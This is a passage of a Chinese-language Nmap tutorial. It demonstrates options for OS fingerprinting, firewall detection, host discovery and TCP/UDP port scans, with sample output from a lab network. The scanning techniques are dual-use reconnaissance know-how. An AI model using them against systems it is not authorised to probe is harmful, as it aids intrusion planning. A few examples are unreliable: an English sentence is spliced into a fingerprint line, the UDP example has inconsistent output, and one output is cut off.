class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">255</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">5.313</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="9-扫描操作系统信息和路由跟踪-A"><a href="#9-扫描操作系统信息和路由跟踪-A" class="headerlink" title="9.扫描操作系统信息和路由跟踪-A"></a>9.扫描操作系统信息和路由跟踪-A</h3><p>使用Nmap，你可以检测远程主机上运行的操作系统和版本。为了启用操作系统和版本检测，脚本扫描和路由跟踪功能，我们可以使用NMAP的“<strong>-A</strong>“选项。</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -<span class="type">A</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">16</span>:<span class="number">25</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((<span class="type">CentOS</span>))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line">No exact OS matches for host (<span class="type">If</span> you know what <span class="type">OS</span> is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(<span class="type">V</span>=4.11%<span class="type">P</span>=i686-redhat-linux-gnu%<span class="type">D</span>=11/11%<span class="type">Tm</span>=52814B66%<span class="type">O</span>=22%<span class="type">C</span>=1%<span class="type">M</span>=080027)</span><br><span class="line">TSeq(<span class="type">Class</span>=<span class="type">TR</span>%<span class="type">IPID</span>=<span class="type">Z</span>%<span class="type">TS</span>=1000HZ)</span><br><span class="line">T1(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T2(<span class="type">Resp</span>=<span class="type">N</span>)</span><br><span class="line">T3(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T4(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T5(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">T6(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T7(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">PU(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">N</span>%<span class="type">TOS</span>=<span class="type">C0</span>%<span class="type">IPLEN</span>=164%<span class="type">RIPTL</span>=148%<span class="type">RID</span>=<span class="type">E</span>%<span class="type">RIPCK</span>=<span class="type">E</span>%<span class="type">UCK</span>=<span class="type">E</span>%<span class="type">ULEN</span>=134%<span class="type">DAT</span>=<span class="type">E</span>)</span><br><span class="line"> </span><br><span class="line">Uptime 0.169 days (since <span class="type">Mon</span> <span class="type">Nov</span> 11 12:22:15 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 22.271 seconds</span><br></pre></td></tr></table></figure>

<p>从上面的输出你可以看到，Nmap显示出了远程主机<strong>操作系统的TCP</strong> / <strong>IP</strong>协议指纹，并且更加具体的显示出远程主机上的端口和服务。</p>
<h3 id="10-启用Nmap的操作系统探测功能-O"><a href="#10-启用Nmap的操作系统探测功能-O" class="headerlink" title="10.启用Nmap的操作系统探测功能-O"></a>10.启用Nmap的操作系统探测功能-O</h3><p>使用选项“<strong>-O</strong>”和“<strong>-osscan-guess</strong>”也帮助探测操作系统信息。</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -<span class="type">O</span> server2.tecmint.com</span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">17</span>:<span class="number">40</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line">No exact OS matches for host (<span class="type">If</span> you know what <span class="type">OS</span> is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(<span class="type">V</span>=4.11%<span class="type">P</span>=i686-redhat-linux-gnu%<span class="type">D</span>=11/11%<span class="type">Tm</span>=52815CF4%<span class="type">O</span>=22%<span class="type">C</span>=1%<span class="type">M</span>=080027)</span><br><span class="line">TSeq(<span class="type">Class</span>=<span class="type">TR</span>%<span class="type">IPID</span>=<span class="type">Z</span>%<span class="type">TS</span>=1000HZ)</span><br><span class="line">T1(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T2(<span class="type">Resp</span>=<span class="type">N</span>)</span><br><span class="line">T3(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T4(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">Option</span> -<span class="type">O</span> and -osscan-guess also helps to discover <span class="type">OS</span></span><br><span class="line"><span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T5(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">T6(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T7(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">PU(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">N</span>%<span class="type">TOS</span>=<span class="type">C0</span>%<span class="type">IPLEN</span>=164%<span class="type">RIPTL</span>=148%<span class="type">RID</span>=<span class="type">E</span>%<span class="type">RIPCK</span>=<span class="type">E</span>%<span class="type">UCK</span>=<span class="type">E</span>%<span class="type">ULEN</span>=134%<span class="type">DAT</span>=<span class="type">E</span>)</span><br><span class="line"> </span><br><span class="line">Uptime 0.221 days (since <span class="type">Mon</span> <span class="type">Nov</span> 11 12:22:16 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 11.064 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="11-扫描主机侦测防火墙-sA"><a href="#11-扫描主机侦测防火墙-sA" class="headerlink" title="11.扫描主机侦测防火墙-sA"></a>11.扫描主机侦测防火墙-sA</h3><p>下面的命令将扫描远程主机以探测该主机是否使用了包过滤器或防火墙。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sA <span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) <span class="meta">at</span> <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">27</span> EST</span><br><span class="line">All <span class="number">1680</span> scanned ports on server2.tecmint.com (<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span>) are UNfiltered</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.382</span> seconds</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="12-扫描主机检测是否有防火墙保护-PN"><a href="#12-扫描主机检测是否有防火墙保护-PN" class="headerlink" title="12.扫描主机检测是否有防火墙保护-PN"></a>12.扫描主机检测是否有防火墙保护-PN</h3><p>扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PN <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">30</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.399</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="13-找出网络中的在线主机-sP"><a href="#13-找出网络中的在线主机-sP" class="headerlink" title="13.找出网络中的在线主机-sP"></a>13.找出网络中的在线主机-sP</h3><p>使用“<strong>-sP</strong>”选项，我们可以简单的检测网络中有哪些在线主机，该选项会跳过端口扫描和其他一些检测。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sP <span class="number">192.168</span>.<span class="number">0</span>.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">11</span>:<span class="number">01</span> EST</span><br><span class="line">Host server1.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.100</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span>.</span><br><span class="line">Host server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span>.</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: <span class="number">256</span> IP addresses (<span class="number">2</span> hosts <span class="keyword">up</span>) scanned in <span class="number">5.109</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="14-执行快速扫描-F"><a href="#14-执行快速扫描-F" class="headerlink" title="14.执行快速扫描-F"></a>14.执行快速扫描-F</h3><p>你可以使用“<strong>-F</strong>”选项执行一次快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其它的端口。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -F <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">47</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1234</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.322</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="15-查看Nmap的版本"><a href="#15-查看Nmap的版本" class="headerlink" title="15.查看Nmap的版本"></a>15.查看Nmap的版本</h3><p>你可以使用“<strong>-V</strong>”选项来检测你机子上Nmap的版本。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]<span class="comment"># nmap -V</span></span><br><span class="line"> </span><br><span class="line">Nmap version <span class="number">4.11</span> ( http:<span class="regexp">//</span>www.insecure.org<span class="regexp">/nmap/</span> )</span><br><span class="line">You have new mail <span class="keyword">in</span> <span class="regexp">/var/</span>spool<span class="regexp">/mail/</span>root</span><br></pre></td></tr></table></figure>

<h3 id="16-顺序扫描端口-r"><a href="#16-顺序扫描端口-r" class="headerlink" title="16.顺序扫描端口-r"></a>16.顺序扫描端口-r</h3><p>使用“-r”选项表示不会随机的选择端口扫描。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -r <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">52</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.363</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="17-打印主机接口和路由-iflist"><a href="#17-打印主机接口和路由-iflist" class="headerlink" title="17.打印主机接口和路由-iflist"></a>17.打印主机接口和路由-iflist</h3><p>你可以使用nmap的“<strong>–iflist</strong>”选项检测主机接口和路由信息。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap --iflist</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:07 EST</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">****INTERFACES**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line">DEV  (SHORT) IP/MASK          TYPE     UP MAC</span><br><span class="line">lo   (lo)    127.0.0.1/8      loopback up</span><br><span class="line">eth0 (eth0)  192.168.0.100/24 ethernet up 08:00:27:11:C7:89</span><br><span class="line"> </span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="emphasis">*ROUTES*</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span></span><br><span class="line">DST/MASK      DEV  GATEWAY</span><br><span class="line">192.168.0.0/0 eth0</span><br><span class="line">169.254.0.0/0 eth0</span><br></pre></td></tr></table></figure>

<p>从上面的输出你可以看到，nmap列举出了你系统上的接口以及它们各自的路由信息。</p>
<h3 id="18-扫描特定的端口-p"><a href="#18-扫描特定的端口-p" class="headerlink" title="18.扫描特定的端口-p"></a>18.扫描特定的端口-p</h3><p>使用Nmap扫描远程机器的端口有各种选项，你可以使用“-<strong>p</strong>”选项指定你想要扫描的端口，默认情况下nmap只扫描<strong>TCP</strong>端口。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span> <span class="number">80</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">12</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) sca</span><br></pre></td></tr></table></figure>

<h3 id="19-扫描TCP端口-p-T"><a href="#19-扫描TCP端口-p-T" class="headerlink" title="19.扫描TCP端口-p T:"></a>19.扫描TCP端口-p T:</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span> T:<span class="number">8888</span>,<span class="number">80</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">15</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.157</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="20-扫描UDP端口-sU"><a href="#20-扫描UDP端口-sU" class="headerlink" title="20.扫描UDP端口-sU"></a>20.扫描UDP端口-sU</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sU <span class="number">53</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">15</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">53</span>/udp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8888</span>/udp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.157</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="21-扫描多个端口"><a href="#21-扫描多个端口" class="headerlink" title="21.扫描多个端口"></a>21.扫描多个端口</h3><p>你还可以使用选项“-<strong>P</strong>”来扫描多个端口。</p>
